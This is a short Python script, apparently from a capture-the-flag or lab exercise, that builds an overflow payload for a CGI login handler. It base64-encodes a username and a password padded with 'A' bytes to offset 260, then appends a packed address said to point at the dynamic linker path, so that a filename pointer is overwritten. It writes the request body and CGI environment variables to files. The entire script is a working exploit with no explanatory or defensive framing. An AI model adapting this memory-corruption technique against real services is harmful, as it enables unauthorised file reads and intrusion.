import base64
import struct

if __name__ == "__main__":
    # user + pass = runtime linker statistics:
    user = b"runtime linker statistics"
    pwd = b"\x00" # terminate with 0 to end user / pass string before overwrite data

    inj_offset = 260 # offset to where filename address begins
    user_pwd_len = len(user) + len(pwd) + 1 # add 1 for inclusion of ":"

    pwd_fill = b"A" * (inj_offset - user_pwd_len)
    filename_addr = struct.pack("<I", 0x004002a8) # location of "/lib64/ld-linux-x86-64.so.2"
    pwd += pwd_fill + filename_addr

    user = base64.b64encode(user).decode()
    pwd = base64.b64encode(pwd).decode()

    data = f'{{"user":"{user}","pass":"{pwd}"}}'

    with open("data.txt", "w") as outfile:
        outfile.write(data)

    with open("env.txt", "w") as outfile:
        outfile.write("REQUEST_METHOD=POST\n")
        outfile.write(f"CONTENT_LENGTH={len(data)}\n")
